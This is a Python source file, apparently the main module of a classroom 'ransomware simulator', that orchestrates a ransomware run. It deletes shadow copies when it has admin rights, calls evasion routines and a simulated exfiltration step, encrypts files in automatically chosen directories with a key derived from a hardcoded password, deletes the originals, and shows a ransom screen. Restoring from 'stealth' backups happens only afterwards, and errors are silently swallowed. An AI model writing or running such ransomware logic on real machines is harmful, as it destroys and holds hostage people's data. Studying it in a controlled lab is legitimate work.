# -*- coding: utf-8 -*-
import threading, time, random, shutil
from pathlib import Path

import evasion
import crypto_manager
import file_system
import ui as ui_manager

TEACHER_PASSWORD = "bob"

class RansomwareSimulator:
    def __init__(self):
        self.all_backups = []
        self.encrypted_files = []
        self.key = None

    def process_file(self, file_path, key):
        try:
            file_system.simulate_exfiltration(file_path)
            with open(file_path, 'rb') as f:
                content = f.read()
            encrypted = crypto_manager.encrypt_intermittent(content, key)
            new_name = file_path.with_suffix(file_path.suffix + '.encrypted')
            with open(new_name, 'wb') as f:
                f.write(encrypted)
            file_path.unlink()
            self.encrypted_files.append(str(new_name))
        except: pass

    def run(self):
        if evasion.is_admin():
            evasion.delete_shadow_copies() 
        
        evasion.evade_detection()
        self.key = crypto_manager.derive_key(TEACHER_PASSWORD)
        
        targets = file_system.get_automatic_targets()
        
        for target_dir in targets:
            try:
                # --- CORRECTION CRUCIALE ICI ---
                # On met le .exists() à l'INTERIEUR du try pour attraper le PermissionError
                if not target_dir.exists(): 
                    continue
                
                b_dir, b_map = file_system.create_stealth_backup(target_dir)
                if b_dir:
                    self.all_backups.append((b_dir, b_map))
                
                threads = []
                try:
                    for file_path in target_dir.glob("*"):
                        if file_path.is_file() and not file_path.name.startswith('.'):
                            t = threading.Thread(target=self.process_file, args=(file_path, self.key))
                            t.start()
                            threads.append(t)
                except PermissionError:
                    continue 
                
                for t in threads: t.join()
            except (PermissionError, OSError):
                # On ignore silencieusement les dossiers interdits (comme /home/tech)
                continue
            except Exception:
                continue
        
        evasion.clear_screen()
        ui_manager.launch_ransom_gui()
        
        for b_dir, b_map in self.all_backups:
            file_system.restore_files(b_map)
            if b_dir: shutil.rmtree(b_dir)

if __name__ == "__main__":
    sim = RansomwareSimulator()
    sim.run()
